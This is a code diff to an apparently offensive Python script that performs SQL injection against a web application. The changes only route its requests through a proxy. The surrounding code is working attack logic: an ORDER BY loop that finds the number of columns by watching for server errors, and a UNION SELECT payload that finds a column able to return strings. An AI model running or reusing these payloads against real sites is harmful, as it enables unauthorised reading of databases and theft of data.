@@ -10,7 +10,7 @@ def exploit(url):
     order = int(sys.argv[2]) + 1
     for i in range(1,order):
         payload = f"'+order+by+{i}--+-"
-        request = requests.get(url + uri + payload, verify=False)
+        request = requests.get(url + uri + payload, verify=False, proxies=proxies)
         response = request.text
         if "Internal Server Error" in  response:
             return (i - 1)
@@ -23,7 +23,7 @@ def stringField(url, column):
         payloadList = ['null'] * column
         payloadList[i-1] = value
         sql = f"' union select {','.join(payloadList)}-- -"
-        request = requests.get(url + uri + sql, verify=False)
+        request = requests.get(url + uri + sql, verify=False, proxies=proxies)
         response = request.text
         if "Internal Server Error" not in response:
            return i
